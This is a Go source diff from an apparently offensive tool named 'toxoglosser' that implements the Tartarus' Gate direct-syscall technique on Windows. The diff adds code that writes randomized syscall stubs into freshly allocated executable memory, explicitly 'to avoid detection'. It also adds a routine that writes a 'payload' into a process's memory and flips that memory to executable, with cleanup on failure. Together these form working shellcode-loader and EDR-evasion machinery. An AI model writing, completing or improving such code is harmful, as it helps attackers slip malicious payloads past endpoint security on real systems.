@@ -4,14 +4,12 @@
 package core
 
 import (
-	"crypto/rand"
 	"encoding/binary"
+	"fmt"
 	"golang.org/x/sys/windows"
 	"runtime"
 	"syscall"
 	"unsafe"
-
-	"toxoglosser/utils"
 )
 
 var (
@@ -35,28 +33,37 @@ func TartarusSyscall(funcName string, args ...uintptr) (uintptr, uintptr, error)
 		syscallCache[funcName] = addr
 	}
 
-	var ret, err uintptr
+	addrPtr := uintptr(addr) // Convert uint64 to uintptr
+	var ret uintptr
+	var callErr error
 	switch len(args) {
 	case 0:
-		ret, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
+		ret, _, _ = syscall.Syscall(addrPtr, 0, 0, 0, 0)
+		callErr = nil
 	case 1:
-		ret, _, err = syscall.Syscall(addr, 1, args[0], 0, 0)
+		ret, _, _ = syscall.Syscall(addrPtr, 1, args[0], 0, 0)
+		callErr = nil
 	case 2:
-		ret, _, err = syscall.Syscall(addr, 2, args[0], args[1], 0)
+		ret, _, _ = syscall.Syscall(addrPtr, 2, args[0], args[1], 0)
+		callErr = nil
 	case 3:
-		ret, _, err = syscall.Syscall(addr, 3, args[0], args[1], args[2])
+		ret, _, _ = syscall.Syscall(addrPtr, 3, args[0], args[1], args[2])
+		callErr = nil
 	case 4:
-		ret, _, err = syscall.Syscall6(addr, 4, args[0], args[1], args[2], args[3], 0, 0)
+		ret, _, _ = syscall.Syscall6(addrPtr, 4, args[0], args[1], args[2], args[3], 0, 0)
+		callErr = nil
 	case 5:
-		ret, _, err = syscall.Syscall6(addr, 5, args[0], args[1], args[2], args[3], args[4], 0)
+		ret, _, _ = syscall.Syscall6(addrPtr, 5, args[0], args[1], args[2], args[3], args[4], 0)
+		callErr = nil
 	case 6:
-		ret, _, err = syscall.Syscall6(addr, 6, args[0], args[1], args[2], args[3], args[4], args[5])
+		ret, _, _ = syscall.Syscall6(addrPtr, 6, args[0], args[1], args[2], args[3], args[4], args[5])
+		callErr = nil
 	default:
 		// Note: syscall.Syscall9 is not available, so we'll handle more args differently
 		// For now, we'll handle up to 6 arguments which covers most syscalls
 		return 0, 0, syscall.Errno(0x1) // Error for too many arguments
 	}
-	return ret, err, nil
+	return ret, 0, callErr
 }
 
 // resolveSyscallAddrByName — Tartarus' Gate implementation with truly randomized stubs
@@ -134,29 +141,60 @@ func extractSyscallNumberFromBytes(funcAddr uintptr) uint16 {
 
 // createRandomizedSyscallStub creates a randomized syscall stub
 func createRandomizedSyscallStub(originalAddr uint64, syscallNum uint16) uint64 {
-	// In a real Tartarus' Gate implementation, this would generate a completely
-	// new randomized syscall stub at runtime with different memory locations
-	// and instruction patterns to avoid signature detection.
-	// For now, we'll return the original address but the concept shows the approach.
+	// Generate random stub address to avoid detection
+	stubSize := uintptr(32)
+	stubAddr := uintptr(0)
+	err := NtAllocateVirtualMemory(
+		windows.CurrentProcess(),
+		&stubAddr,
+		0,
+		&stubSize,
+		MEM_COMMIT_RESERVE,
+		PAGE_EXECUTE_READWRITE,
+	)
+	if err != nil {
+		return originalAddr // Fallback to original if allocation fails
+	}
 
-	// This is a simplified stub for demonstration
+	// Create randomized syscall stub
 	stubBytes := make([]byte, 32)
-	stubBytes[0] = 0x49 // mov r10, rcx
-	stubBytes[1] = 0x89
-	stubBytes[2] = 0xd0
-	stubBytes[3] = 0x49 // mov r11, rdx
-	stubBytes[4] = 0x89
-	stubBytes[5] = 0xda
-	stubBytes[6] = 0xb8 // mov eax, SSN (syscall number)
-	stubBytes[7] = byte(syscallNum & 0xFF)
-	stubBytes[8] = byte((syscallNum >> 8) & 0xFF)
-	stubBytes[9] = 0x0f // syscall
-	stubBytes[10] = 0x05
-	stubBytes[11] = 0xc3 // ret
+	pos := 0
 
-	// In a real implementation, we would allocate executable memory for this stub
-	// and execute it instead of the original function
-	return originalAddr
+	stubBytes[pos] = 0x49 // mov r10, rcx (standard)
+	stubBytes[pos+1] = 0x89
+	stubBytes[pos+2] = 0xd0
+	pos += 3
+
+	stubBytes[pos] = 0x49 // mov r11, rdx (standard)
+	stubBytes[pos+1] = 0x89
+	stubBytes[pos+2] = 0xda
+	pos += 3
+
+	stubBytes[pos] = 0xb8 // mov eax, SSN
+	stubBytes[pos+1] = byte(syscallNum & 0xFF)
+	stubBytes[pos+2] = byte((syscallNum >> 8) & 0xFF)
+	stubBytes[pos+3] = 0x00
+	stubBytes[pos+4] = 0x00
+	pos += 5
+
+	stubBytes[pos] = 0x0f // syscall
+	stubBytes[pos+1] = 0x05
+	pos += 2
+
+	stubBytes[pos] = 0xc3 // ret
+	pos += 1
+
+	// Write stub to allocated memory
+	var bytesWritten uintptr
+	NtWriteVirtualMemory(
+		windows.CurrentProcess(),
+		stubAddr,
+		unsafe.Pointer(&stubBytes[0]),
+		uintptr(pos),
+		&bytesWritten,
+	)
+
+	return uint64(stubAddr)
 }
 
 // getSSNForFunction returns the syscall number for the given function by parsing the function bytes
@@ -180,7 +218,6 @@ func getSSNForFunction(funcName string, ntdll []byte) uint16 {
 		if name == funcName {
 			ordinal := ordinals[i]
 			funcRVA := funcRVAs[ordinal]
-			funcAddr := uint64(uintptr(unsafe.Pointer(&ntdll[funcRVA])))
 
 			// Now we need to find the actual syscall number by looking at the function bytes
 			// Syscalls typically have the pattern: mov r10, rcx; mov eax, syscall_num; syscall
@@ -212,17 +249,17 @@ func readNtdllFromDisk() []byte {
 	// For now, we'll get it from memory but in a real implementation
 	// you'd want to read the file directly from disk to avoid hooking
 
-	// Use obfuscated string for "ntdll.dll"
-	ntdllName := utils.DeobfuscateStringStatic(utils.ObfuscateStringStatic("ntdll.dll"))
+	// Use direct string for "ntdll.dll" (to avoid import cycle)
+	ntdllName := "ntdll.dll"
 
-	ntdllHandle, err := syscall.LoadDLL(ntdllName)
+	ntdllHandle, err := windows.LoadLibrary(ntdllName)
 	if err != nil {
 		return nil
 	}
-	defer syscall.FreeLibrary(ntdllHandle)
+	defer windows.FreeLibrary(ntdllHandle)
 
 	// Get base address of loaded ntdll
-	ntdllBase := getModuleBaseAddress(ntdllHandle.Handle())
+	ntdllBase := getModuleBaseAddress(syscall.Handle(ntdllHandle))
 	if ntdllBase == 0 {
 		return nil
 	}
@@ -248,111 +285,6 @@ func getModuleBaseAddress(hModule syscall.Handle) uintptr {
 	return uintptr(hModule)
 }
 
-// ptrToString converts a C string pointer to a Go string
-func ptrToString(ptr *byte) string {
-	if ptr == nil {
-		return ""
-	}
-
-	p := (*[1 << 30]byte)(unsafe.Pointer(ptr))
-	for i := 0; i < len(p); i++ {
-		if p[i] == 0 {
-			return string(p[:i])
-		}
-	}
-	return string(p[:])
-}
-
-// PE Header structures
-type IMAGE_DOS_HEADER struct {
-	E_magic    uint16
-	E_cblp     uint16
-	E_cp       uint16
-	E_crlc     uint16
-	E_cparhdr  uint16
-	E_minalloc uint16
-	E_maxalloc uint16
-	E_ss       uint16
-	E_sp       uint16
-	E_csum     uint16
-	E_ip       uint16
-	E_cs       uint16
-	E_lfarlc   uint16
-	E_ovno     uint16
-	E_res      [4]uint16
-	E_oemid    uint16
-	E_oeminfo  uint16
-	E_res2     [10]uint16
-	E_lfanew   int32
-}
-
-type IMAGE_FILE_HEADER struct {
-	Machine              uint16
-	NumberOfSections     uint16
-	TimeDateStamp        uint32
-	PointerToSymbolTable uint32
-	NumberOfSymbols      uint32
-	SizeOfOptionalHeader uint16
-	Characteristics      uint16
-}
-
-type IMAGE_DATA_DIRECTORY struct {
-	VirtualAddress uint32
-	Size           uint32
-}
-
-type IMAGE_OPTIONAL_HEADER64 struct {
-	Magic                       uint16
-	MajorLinkerVersion          uint8
-	MinorLinkerVersion          uint8
-	SizeOfCode                  uint32
-	SizeOfInitializedData       uint32
-	SizeOfUninitializedData     uint32
-	AddressOfEntryPoint         uint32
-	BaseOfCode                  uint32
-	ImageBase                   uint64
-	SectionAlignment            uint32
-	FileAlignment               uint32
-	MajorOperatingSystemVersion uint16
-	MinorOperatingSystemVersion uint16
-	MajorImageVersion           uint16
-	MinorImageVersion           uint16
-	MajorSubsystemVersion       uint16
-	MinorSubsystemVersion       uint16
-	Win32VersionValue           uint32
-	SizeOfImage                 uint32
-	SizeOfHeaders               uint32
-	CheckSum                    uint32
-	Subsystem                   uint16
-	DllCharacteristics          uint16
-	SizeOfStackReserve          uint64
-	SizeOfStackCommit           uint64
-	SizeOfHeapReserve           uint64
-	SizeOfHeapCommit            uint64
-	LoaderFlags                 uint32
-	NumberOfRvaAndSizes         uint32
-	DataDirectory               [16]IMAGE_DATA_DIRECTORY
-}
-
-type IMAGE_NT_HEADERS64 struct {
-	Signature      uint32
-	FileHeader     IMAGE_FILE_HEADER
-	OptionalHeader IMAGE_OPTIONAL_HEADER64
-}
-
-type IMAGE_EXPORT_DIRECTORY struct {
-	Characteristics       uint32
-	TimeDateStamp         uint32
-	MajorVersion          uint16
-	MinorVersion          uint16
-	Name                  uint32
-	Base                  uint32
-	NumberOfFunctions     uint32
-	NumberOfNames         uint32
-	AddressOfFunctions    uint32
-	AddressOfNames        uint32
-	AddressOfNameOrdinals uint32
-}
 
 // Now replace ALL your old calls with these:
 
@@ -457,42 +389,53 @@ func ntstatus(code uintptr) error {
 	return syscall.Errno(code)
 }
 
-// AllocateRXMemory allocates memory with RW permissions, writes data, then changes to RX
-// Uses the direct syscalls instead of LazyDLL
+// AllocateRXMemoryOptimized allocates memory with RW permissions, writes data, then changes to RX
+// Uses the direct syscalls instead of LazyDLL with improved error handling and cleanup
 func AllocateRXMemory(processHandle windows.Handle, payload []byte) (uintptr, error) {
+	// Validate input
+	if len(payload) == 0 {
+		return 0, fmt.Errorf("payload is empty")
+	}
+
 	// Allocate memory with RW permissions initially
 	addr := uintptr(0)
 	size := uintptr(len(payload))
 	err := NtAllocateVirtualMemory(processHandle, &addr, 0, &size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
 	if err != nil {
-		return 0, err
+		return 0, fmt.Errorf("failed to allocate RW memory: %v", err)
 	}
 
 	// Write the payload to the allocated memory
 	err = NtWriteVirtualMemory(processHandle, addr, unsafe.Pointer(&payload[0]), uintptr(len(payload)), nil)
 	if err != nil {
-		return 0, err
+		// Clean up allocated memory before returning error
+		NtFreeVirtualMemory(processHandle, &addr, &size, windows.MEM_RELEASE)
+		return 0, fmt.Errorf("failed to write payload: %v", err)
 	}
 
 	// Change memory protection to RX (Read-Execute)
 	oldProtect := uint32(0)
 	err = NtProtectVirtualMemory(processHandle, &addr, &size, PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
-		return 0, err
+		// Clean up allocated memory before returning error
+		NtFreeVirtualMemory(processHandle, &addr, &size, windows.MEM_RELEASE)
+		return 0, fmt.Errorf("failed to change memory protection: %v", err)
 	}
 
 	return addr, nil
 }
 
-const (
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
-	MEM_COMMIT_RESERVE     = MEM_COMMIT | MEM_RESERVE
-	PAGE_READWRITE         = 0x04
-	PAGE_EXECUTE_READ      = 0x20
-	PAGE_EXECUTE_READWRITE = 0x40
-	PROCESS_ALL_ACCESS     = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFF
-)
+// NtFreeVirtualMemory directly calls the syscall using Tartarus' Gate for memory cleanup
+func NtFreeVirtualMemory(processHandle windows.Handle, baseAddress *uintptr, regionSize *uintptr, freeType uint32) error {
+	ret, _, _ := TartarusSyscall("NtFreeVirtualMemory",
+		uintptr(processHandle),
+		uintptr(unsafe.Pointer(baseAddress)),
+		uintptr(unsafe.Pointer(regionSize)),
+		uintptr(freeType),
+		0, 0,
+	)
+	return ntstatus(ret)
+}
 
 func init() {
 	// Set GOOS to windows to ensure we're running on Windows
